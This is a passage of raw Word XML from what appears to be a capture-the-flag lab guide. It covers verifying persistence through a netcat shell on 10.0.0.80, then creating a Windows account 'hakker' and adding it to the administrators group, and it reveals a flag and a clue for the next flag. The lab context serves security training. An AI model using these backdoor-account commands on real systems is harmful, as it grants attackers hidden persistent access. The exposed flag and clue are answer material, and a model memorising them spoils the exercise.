                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>f</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>r</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>o</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">m </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>U</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>N</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>K</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>NO</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>W</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>N</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t xml:space="preserve">) </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>0</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>]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</w:tcPr>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:before="9" w:line="120" w:lineRule="exact"/>
              <w:rPr>
                <w:sz w:val="13"/>
                <w:szCs w:val="13"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:line="200" w:lineRule="exact"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
            <w:pPr>
              <w:spacing w:line="200" w:lineRule="exact"/>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
            <w:pPr>
              <w:ind w:left="6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color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="1"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:spacing w:val="-2"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>68</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
                <w:color w:val="404040"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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9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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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V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erify</w:t>
      </w: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that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Per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iste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>n</w:t>
      </w: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e is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Working</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In your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etcat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v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er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e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he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l,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ew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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="412" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="889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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pwd dir whoami</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="1"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Cr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 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k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color w:val="404040"/>
          <w:spacing w:val="3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er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unt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on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-pc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(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e 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ine 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):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>net user hakker guessthis /add</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>net localgroup administrators /add hakker</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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10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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-43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 xml:space="preserve">Capture the </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position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position w:val="-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 xml:space="preserve">lag in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position w:val="-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-3"/>
          <w:position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me</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-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1"/>
          <w:position w:val="-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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1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2"/>
          <w:position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position w:val="-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nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> r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ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-1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3"/>
          <w:position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1"/>
          <w:position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2"/>
          <w:position w:val="-1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ere.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/>
        <w:ind w:left="252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808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidR="009A7B07" w:rsidRPr="009A7B07">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>persistence_pays_off</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve">                                     </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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11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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-43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 xml:space="preserve">Clue to the </w:t>
      </w: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N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>x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 xml:space="preserve">t </w:t>
      </w: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F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lag</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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pacing w:val="1"/>
          <w:position w:val="-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 xml:space="preserve">.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="22"/>
          <w:position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Loc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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position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 xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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he c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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 xml:space="preserve">ue in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position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 xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1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-1"/>
          <w:position w:val="-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-1"/>
          <w:position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me</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position w:val="-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2"/>
          <w:position w:val="-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1"/>
          <w:position w:val="-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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:position w:val="-1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1"/>
          <w:position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2"/>
          <w:position w:val="-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nd</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position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position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pacing w:val="-2"/>
          <w:position w:val="-1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1"/>
          <w:position w:val="-1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3"/>
          <w:position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1"/>
          <w:position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-2"/>
          <w:position w:val="-1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1"/>
          <w:position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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="37" w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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pict>
          <v:group id="_x0000_s1086" style="position:absolute;left:0;text-align:left;margin-left:125.5pt;margin-top:1.35pt;width:339pt;height:13.5pt;z-index:-1885;mso-position-horizontal-relative:page" coordorigin="2510,27" coordsize="6780,270">
            <v:shape id="_x0000_s1088" style="position:absolute;left:2520;top:37;width:6760;height:250" coordorigin="2520,37" coordsize="6760,250" path="m2520,287r6760,l9280,37r-6760,l2520,287xe" fillcolor="aqua" stroked="f">
              <v:path arrowok="t"/>
            </v:shape>
            <v:shape id="_x0000_s1087" style="position:absolute;left:3121;top:261;width:6160;height:0" coordorigin="3121,261" coordsize="6160,0" path="m3121,261r6160,e" filled="f" strokecolor="gray" strokeweight=".26094mm">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>UE:</w:t>
      </w:r>
      <w:r w:rsidR="009A7B07" w:rsidRPr="009A7B07">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="009A7B07">
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidR="009A7B07" w:rsidRPr="009A7B07">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>f Mannie's watching, then Mannie's logging. Find the dev note and trace the cookie trail.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="12" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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12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.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="17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>B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read</w:t>
      </w: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ru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>m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b</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
